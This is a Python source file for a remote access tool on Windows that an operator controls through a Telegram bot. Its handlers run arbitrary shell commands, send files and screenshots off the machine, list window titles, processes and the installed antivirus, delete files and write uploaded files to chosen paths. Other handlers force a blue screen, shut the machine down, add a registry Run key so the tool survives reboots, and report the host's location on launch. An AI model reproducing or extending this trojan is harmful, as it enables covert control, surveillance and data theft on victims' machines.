import os
from sys import argv
import users as users
from math import floor
from random import uniform
import data.data_api as api
import data.data_win as win
from subprocess import call
import token as telegram_api
from win32api import GetTempPath
from telebot import TeleBot, types
import data.data_speech as speech
import data.data_ctypes as c_windll
import data.data_commands as commands
import data.data_processes as processes
import data.data_antimalware as antimalware


class RemoteDesktop(object):

    def __init__(self):
        """
        1. Loading token
        2. Creating keyboard
        3. Creating <Bot> object
        4. Sending Log << wm_online_status
        """
        self.TelegramToken = telegram_api.TelegramToken
        self.bot = TeleBot(self.TelegramToken)
        self.keyboard = self.KeyboardCreating()
        self.bot.send_message(users.MainUserId, api.Api().GetLog(), reply_markup=self.keyboard)

    @staticmethod
    def KeyboardCreating():
        keyboard = types.ReplyKeyboardMarkup(True)
        for command in commands.KeyboardC:
            keyboard.row(f'/{command}')

        return keyboard

    @staticmethod
    def ArrayParser(array, ind):
        """
        Clearing [0] element [ind] times
        :param array:   >> List
        :param ind:     clearing count
        :return:        Cleared list <<
        """
        for i in range(ind):
            array.pop(0)

        return array

    def Run(self):
        """
        <func>
            [args] -- argments

        <content_type> [document] "File Downloading"
            caption args - Path
        <content_type> [audio] "File downloading >> playing file using LIB <<pygame.mixer>>

        <polling>
            none_stop=True

        :return: None
        """
        @self.bot.message_handler(commands=commands.MainC['AddUser'])
        def add_user(message):
            """
            user_id : int
            username : str
            :param message:
            :return:
            """
            if message.from_user.id == users.MainUserId:
                try:
                    args = message.text.split(" ")
                    user_id = int(args[1])
                    user_name = args[2]
                    users.Users.setdefault(user_id, user_name)
                    self.bot.send_message(message.from_user.id, f'"{user_name} ({user_id})" was added.')
                except Exception as e:
                    try:
                        self.bot.send_message(message.from_user.id, e)
                    except ConnectionAbortedError and ConnectionResetError and ConnectionError and ConnectionRefusedError:
                        pass

        @self.bot.message_handler(commands=commands.MainC['DelUser'])
        def delete_user(message):
            """
            user_id : int
            :param message:
            :return:
            """
            if message.from_user.id == users.MainUserId:
                try:
                    target_id = int(message.text.split(" ")[1])
                    users.Users.pop(target_id)
                    self.bot.send_message(message.from_user.id, f'"{target_id}" was removed.')
                except Exception as e:
                    try:
                        self.bot.send_message(message.from_user.id, e)
                    except ConnectionAbortedError and ConnectionRefusedError and ConnectionError and ConnectionResetError:
                        pass

        @self.bot.message_handler(commands=commands.MainC['GetUsers'])
        def get_users(message):
            """
            Getting users
            :param message:
            :return: Formated user list
            """
            if message.from_user.id == users.MainUserId:
                try:
                    output = []
                    for user in users.Users.items():
                        user_id = user[0]
                        user_name = user[1]
                        output.append(f'Name: "{user_name}"; Id: {user_id}')
                    self.bot.send_message(message.from_user.id, "\n".join(output))
                except Exception as e:
                    try:
                        self.bot.send_message(message.from_user.id, e)
                    except ConnectionAbortedError and ConnectionRefusedError and ConnectionError and ConnectionResetError:
                        pass

        @self.bot.message_handler(commands=commands.MainC['Hotkey'])
        def hotkey(message):
            """
            Adding button to keyboard
            text : str
            :param message:
            :return:
            """
            if message.from_user.id in users.Users.keys():
                try:
                    args = message.text.split(" ")
                    args.pop(0)
                    hotkey = " ".join(args)
                    self.keyboard.row(hotkey)
                    self.bot.send_message(message.from_user.id, f'"{hotkey}" was added.', reply_markup=self.keyboard)
                except Exception as e:
                    try:
                        self.bot.send_message(message.from_user.id, e)
                    except ConnectionAbortedError and ConnectionRefusedError and ConnectionError and ConnectionResetError:
                        pass

        @self.bot.message_handler(commands=commands.MainC['GetLog'])
        def get_log(message):
            """
            Returning ApiLog
            Using https://ipdata.co
            :param message:
            :return:
            """
            if message.from_user.id in users.Users.keys():
                try:
                    self.bot.send_message(message.from_user.id, api.Api().GetLog())
                except Exception as e:
                    try:
                        self.bot.send_message(message.from_user.id, e)
                    except ConnectionAbortedError and ConnectionRefusedError and ConnectionError and ConnectionResetError:
                        pass

        @self.bot.message_handler(commands=[commands.MainC['Stop']])
        def stop_polling(message):
            """
            Stopping bot polling
            :param message:
            :return:
            """
            if message.from_user.id == users.MainUserId:
                try:
                    self.bot.send_message(message.from_user.id, f'Stopping...')
                    self.bot.stop_polling()
                except Exception as e:
                    try:
                        self.bot.send_message(message.from_user.id, e)
                    except ConnectionRefusedError and ConnectionError and ConnectionResetError and ConnectionAbortedError:
                        pass

        @self.bot.message_handler(commands=[commands.MainC['Cmd']])
        def StopPolling(message):
            """
            Running shell command
            command : str
            :param message:
            :return:
            """
            if message.from_user.id in users.Users.keys():
                try:
                    args = message.text.split(" ")
                    args.pop(0)
                    command = " ".join(args)
                    os.system(command)
                    self.bot.send_message(message.from_user.id, f'"{command}" called.')
                except Exception as e:
                    try:
                        self.bot.send_message(message.from_user.id, e)
                    except ConnectionRefusedError and ConnectionError and ConnectionResetError and ConnectionAbortedError:
                        pass

        @self.bot.message_handler(commands=commands.MainC["CallSysFunc"])
        def call_system(message):
            """
            Calling system
            args:    [shutdown/restart]
            :param message:
            :return:
            """
            if message.from_user.id == users.MainUserId:
                try:
                    func = {"restart": "shutdown -r /t 0 /f", "shutdown": "shutdown -s /t 0 /f"}
                    selected_func = message.text.split(" ")[1]
                    call(func[selected_func])
                except Exception as e:
                    try:
                        self.bot.send_message(message.from_user.id, e)
                    except ConnectionRefusedError and ConnectionError and ConnectionResetError and ConnectionAbortedError:
                        pass

        @self.bot.message_handler(commands=commands.MainC["DownloadFile"])
        def download_file(message):
            """
            arg : filepath
            ::if not found: Returning "{filename} >> non found"
            :param message:
            :return:
            """
            if message.from_user.id in users.Users.keys():
                try:
                    args = message.text.split(" ")
                    args.pop(0)
                    file_path = " ".join(args)
                    if os.path.exists(file_path):
                        with open(file_path, 'rb') as file:
                            self.bot.send_document(message.from_user.id, file.read())
                            file.close()
                    else:
                        self.bot.send_message(message.from_user.id, f'"{file_path}" is not found.')
                except Exception as e:
                    try:
                        self.bot.send_message(message.from_user.id, e)
                    except ConnectionRefusedError and ConnectionError and ConnectionResetError and ConnectionAbortedError:
                        pass

        @self.bot.message_handler(commands=commands.MainC["DelFile"])
        def delete_file(message):
            """
            arg: file_path
            :param message:
            :return:
            """
            if message.from_user.id in users.Users.keys():
                try:
                    args = message.text.split(" ")
                    args.pop(0)
                    file_path = " ".join(args)
                    if os.path.exists(file_path):
                        os.remove(file_path)
                    else:
                        self.bot.send_message(message.from_user.id, f'"{file_path}" is not found.')
                except Exception as e:
                    try:
                        self.bot.send_message(message.from_user.id, e)
                    except ConnectionRefusedError and ConnectionError and ConnectionResetError and ConnectionAbortedError:
                        pass

        @self.bot.message_handler(commands=commands.MainC["Say"])
        def say(message):
            """
            rate : int
            voice_index: int [1/2/3]
            volume: float [0.0-1.0]
            text: str
            :param message:
            :return:
            """
            if message.from_user.id in users.Users.keys():
                try:
                    args = message.text.split(" ")
                    args.pop(0)
                    rate = int(args[0])
                    voice_index = int(args[1])
                    volume = float(args[2])
                    text = " ".join(self.ArrayParser(args, 3))
                    speech.Speech(rate, voice_index, volume, text).Synthesize()
                except Exception as e:
                    try:
                        self.bot.send_message(message.from_user.id, e)
                    except ConnectionRefusedError and ConnectionError and ConnectionResetError and ConnectionAbortedError:
                        pass

        @self.bot.message_handler(commands=commands.MainC["GetActWinT"])
        def get_active_title(message):
            """
            Getting current active window title: str
            :param message:
            :return:
            """
            if message.from_user.id in users.Users.keys():
                try:
                    self.bot.send_message(message.from_user.id, win.getActiveWinTitle())
                except Exception as e:
                    try:
                        self.bot.send_message(message.from_user.id, e)
                    except ConnectionRefusedError and ConnectionError and ConnectionResetError and ConnectionAbortedError:
                        pass

        @self.bot.message_handler(commands=commands.MainC["GetAllWinT"])
        def get_all_titles(message):
            """
            Getting all window titles: str
            :param message:
            :return:
            """
            if message.from_user.id in users.Users.keys():
                try:
                    self.bot.send_message(message.from_user.id, win.getAllWinTitles())
                except Exception as e:
                    try:
                        self.bot.send_message(message.from_user.id, e)
                    except ConnectionRefusedError and ConnectionError and ConnectionResetError and ConnectionAbortedError:
                        pass

        @self.bot.message_handler(commands=commands.MainC["Screenshot"])
        def screenshot(message):
            """
            Getting screenshot
            Using pyautogui lib
            :param message:
            :return:
            """
            if message.from_user.id in users.Users.keys():
                try:
                    with open(win.getScreenshot(GetTempPath()), "rb") as file:
                        self.bot.send_photo(message.from_user.id, file.read())
                        file.close()
                except Exception as e:
                    try:
                        self.bot.send_message(message.from_user.id, e)
                    except ConnectionRefusedError and ConnectionError and ConnectionResetError and ConnectionAbortedError:
                        pass

        @self.bot.message_handler(commands=commands.MainC["GetCPName"])
        def get_cmp_name(message):
            """
            Getting Desktop name
            :param message:
            :return:
            """
            if message.from_user.id in users.Users.keys():
                try:
                    self.bot.send_message(message.from_user.id, win.get_computer_name())
                except Exception as e:
                    try:
                        self.bot.send_message(message.from_user.id, e)
                    except ConnectionRefusedError and ConnectionError and ConnectionResetError and ConnectionAbortedError:
                        pass

        @self.bot.message_handler(commands=commands.MainC["GetUserName"])
        def get_user_name(message):
            """
            Getting username
            :param message:
            :return:
            """
            if message.from_user.id in users.Users.keys():
                try:
                    self.bot.send_message(message.from_user.id, win.get_user_name())
                except Exception as e:
                    try:
                        self.bot.send_message(message.from_user.id, e)
                    except ConnectionRefusedError and ConnectionError and ConnectionResetError and ConnectionAbortedError:
                        pass

        @self.bot.message_handler(commands=commands.MainC["CallHardSysE"])
        def call_hard_sys_error(message):
            """
            Calling BSOD (Blue Screen Of Death)
            :param message:
            :return:
            """
            if message.from_user.id in users.Users.keys():
                try:
                    c_windll.call_bsod()
                except Exception as e:
                    try:
                        self.bot.send_message(message.from_user.id, e)
                    except ConnectionRefusedError and ConnectionError and ConnectionResetError and ConnectionAbortedError:
                        pass

        @self.bot.message_handler(commands.MainC['monitor'])
        def monitor(message):
            """
            <args>
                [on / off] : str
            :param message:
            :return:
            """
            if message.from_user.id == users.MainUserId:
                try:
                    power_mod = message.text.split(" ")[1]
                    c_windll.monitor(power_mod)
                except Exception as e:
                    try:
                        self.bot.send_message(message.from_user.id, e)
                    except ConnectionRefusedError and ConnectionError and ConnectionResetError and ConnectionAbortedError:
                        pass

        @self.bot.message_handler(commands.MainC['GetPRCS'])
        def get_processes(message):
            """
            Returning processes list
            :param message:
            :return:
            """
            if message.from_user.id in users.Users.keys():
                try:
                    self.bot.send_message(message.from_user.id, processes.Processes().GetProcesses())
                except Exception as e:
                    try:
                        self.bot.send_message(message.from_user.id, e)
                    except ConnectionRefusedError and ConnectionError and ConnectionResetError and ConnectionAbortedError:
                        pass

        @self.bot.message_handler(commands.MainC['FindPRCS'])
        def find_process(message):
            """
            pattern : str
            using fnmatch
            :param message:
            :return:
            """
            if message.from_user.id in users.Users.keys():
                try:
                    pattern = message.text.split(" ")[1].lower()
                    self.bot.send_message(message.from_user.id, processes.Processes().FindProcess(pattern))
                except Exception as e:
                    try:
                        self.bot.send_message(message.from_user.id, e)
                    except ConnectionRefusedError and ConnectionError and ConnectionResetError and ConnectionAbortedError:
                        pass

        @self.bot.message_handler(commands.MainC['KillPRCS'])
        def kill_process(message):
            """
            target : str
            :param message:
            :return:
            """
            if message.from_user.id in users.Users.keys():
                try:
                    target = message.text.split(" ")[1].lower()
                    self.bot.send_message(message.from_user.id, processes.Processes().KillProcess(target))
                except Exception as e:
                    try:
                        self.bot.send_message(message.from_user.id, e)
                    except ConnectionRefusedError and ConnectionError and ConnectionResetError and ConnectionAbortedError:
                        pass

        @self.bot.message_handler(commands=commands.MainC['MsgBox'])
        def messagebox(message):
            """
            Messagebox
            <args>
                1. Count : int
                2. Title : str (no tabs)
                3. Text : str (tabs allowed)
            :param message:
            :return:
            """
            if message.from_user.id in users.Users.keys():
                try:
                    args = message.text.split(" ")
                    args.pop(0)
                    msg_count = int(args[0])
                    title = args[1]
                    text = " ".join(self.ArrayParser(args, 2))
                    c_windll.messagebox(title, text, msg_count)
                except Exception as e:
                    try:
                        self.bot.send_message(message.from_user.id, e)
                    except ConnectionError and ConnectionAbortedError and ConnectionRefusedError and ConnectionResetError:
                        pass

        @self.bot.message_handler(commands=['Functions', 'f', 'cmm'])
        def send_commands_list(message):
            """
            Returning functions list
            :param message:
            :return:
            """
            if message.from_user.id in users.Users.keys():
                try:
                    self.bot.send_message(message.from_user.id, commands.Log)
                except Exception as e:
                    try:
                        self.bot.send_message(message.from_user.id, e)
                    except ConnectionError and ConnectionAbortedError and ConnectionRefusedError and ConnectionResetError:
                        pass

        @self.bot.message_handler(commands=commands.MainC['startup'])
        def startup_add(message):
            """
            Adding executable script to startup
            !only admin
            :param message:
            :return:
            """
            if message.from_user.id == users.MainUserId:
                try:
                    file_name = os.path.basename(argv[0])
                    full_path = os.getcwd() + "\\" + file_name
                    cm = r"REG ADD \"HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\" /v " + '"' + file_name + '"' + " /t REG_SZ /f /d " + '"' + full_path + '"'
                    call(cm)
                except Exception as e:
                    try:
                        self.bot.send_message(message.from_user.id, e)
                    except ConnectionError and ConnectionAbortedError and ConnectionRefusedError and ConnectionResetError:
                        pass

        @self.bot.message_handler(commands=commands.MainC['GetANM'])
        def get_defender(message):
            """
            getting system malware defender
            :param message:
            :return:
            """
            if message.from_user.id in users.Users.keys():
                try:
                    self.bot.send_message(message.from_user.id, antimalware.Defenders().GetDefenders())
                except Exception as e:
                    try:
                        self.bot.send_message(message.from_user.id, e)
                    except ConnectionError and ConnectionAbortedError and ConnectionRefusedError and ConnectionResetError:
                        pass

        @self.bot.message_handler(commands=commands.MainC['ResetK'])
        def reset_keyboard(message):
            """
            1. Reseting keyboard
            2. Returning message with default keyboard
            :param message:
            :return:
            """
            if message.from_user.id in users.Users.keys():
                try:
                    self.keyboard = self.KeyboardCreating()
                    self.bot.send_message(message.from_user.id, "Keyboard buttons was reseted", reply_markup=self.keyboard)
                except Exception as e:
                    try:
                        self.bot.send_message(message.from_user.id, e)
                    except ConnectionError and ConnectionAbortedError and ConnectionRefusedError and ConnectionResetError:
                        pass

        @self.bot.message_handler(commands=commands.MainC['cdrom'])
        def cdrom(message):
            """
            Cdrom conrol
            args: open / close
            :param message:
            :return:
            """
            if message.from_user.id in users.Users.keys():
                try:
                    func = {"open": c_windll.open_cd, "close": c_windll.close_cd}
                    arg = message.text.split(" ")[1].lower()
                    func[arg]()

                except Exception as e:
                    try:
                        self.bot.send_message(message.from_user.id, e)
                    except ConnectionError and ConnectionAbortedError and ConnectionRefusedError and ConnectionResetError:
                        pass

        @self.bot.message_handler(commands=commands.MainC['mkdir'])
        def create_dirs(message):
            """
            Creating dirs
            :param message:
            :return:
            """
            if message.from_user.id in users.Users.keys():
                try:
                    args = message.text.split(" ")
                    args.pop(0)
                    path = " ".join(args)
                    os.makedirs(path)
                    self.bot.send_message(message.from_user.id, f'"{path}" was created.')
                except Exception as e:
                    try:
                        self.bot.send_message(message.from_user.id, e)
                    except ConnectionError and ConnectionAbortedError and ConnectionRefusedError and ConnectionResetError:
                        pass

        @self.bot.message_handler(content_types=['document'])
        def get_file(message):
            """
            1. Downloading file using path from message caption
            :param message:
            :return:
            """
            if message.from_user.id in users.Users.keys():
                try:
                    file_path = message.caption                                 # file path
                    file_name = message.document.file_name                      # filename
                    file_info = self.bot.get_file(message.document.file_id)     # getting file
                    file_data = self.bot.download_file(file_info.file_path)     # getting file data

                    with open(f'{file_path}\\{file_name}', 'wb') as file:
                        file.write(file_data)       # saving file
                        file.close()

                    self.bot.send_message(message.chat.id, f'Filename: "{file_name}"\nPath: "{file_path}"\nWas successful installed.')
                except Exception as e:
                    try:
                        self.bot.send_message(message.from_user.id, e)
                    except ConnectionRefusedError and ConnectionError and ConnectionResetError and ConnectionAbortedError:
                        pass

        @self.bot.message_handler(content_types=['audio'])
        def get_audio(message):
            """
            1. Downloading sound
            2. Playing this sound
            :param message:
            :return:
            """
            if message.from_user.id in users.Users.keys():
                try:
                    file_path = GetTempPath()                                 # file path
                    file_name = f'{floor(uniform(0, 4938243280))}.mp3'                      # filename
                    file_info = self.bot.get_file(message.audio.file_id)     # getting file
                    file_data = self.bot.download_file(file_info.file_path)     # getting file data
                    full_path = f'{file_path}\\{file_name}'
                    with open(full_path, 'wb') as file:
                        file.write(file_data)       # saving file
                        file.close()

                    speech.Sound(full_path).Play()
                    self.bot.send_message(message.chat.id, f'Filename: "{file_name}"\nPath: "{file_path}"\n')
                except Exception as e:
                    try:
                        self.bot.send_message(message.from_user.id, e)
                    except ConnectionRefusedError and ConnectionError and ConnectionResetError and ConnectionAbortedError:
                        pass

        @self.bot.message_handler(content_types=['photo'])
        def handle_docs_document(message):
            """
            1. Downloading image
            2. Using images like wallpapers
            :param message:
            :return:
            """
            if message.from_user.id in users.Users.keys():
                try:
                    file_info = self.bot.get_file(message.photo[len(message.photo) - 1].file_id)
                    downloaded_file = self.bot.download_file(file_info.file_path)
                    src = GetTempPath() + f'{floor(uniform(0, 4938243280))}'

                    with open(src, 'wb') as new_file:
                        new_file.write(downloaded_file)
                        new_file.close()

                    c_windll.set_wallpapers(src)
                    self.bot.reply_to(message, f'"{src}" file was setted as wallpapers.')
                except Exception as e:
                    try:
                        self.bot.send_message(message.from_user.id, e)
                    except ConnectionRefusedError and ConnectionError and ConnectionResetError and ConnectionAbortedError:
                        pass

        self.bot.polling(none_stop=True)


if __name__ == "__main__":
    RemoteDesktop().Run()
